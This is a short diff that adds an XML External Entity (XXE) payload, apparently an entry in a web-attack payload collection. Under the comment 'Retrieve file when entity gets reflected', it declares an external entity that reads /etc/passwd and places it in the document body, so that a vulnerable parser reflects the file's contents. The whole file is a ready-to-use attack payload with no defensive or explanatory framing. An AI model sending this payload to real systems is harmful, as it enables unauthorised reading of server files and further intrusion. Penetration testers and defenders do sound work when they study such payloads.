@@ -1,0 +1,7 @@
+# Retrieve file when entity gets reflected
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
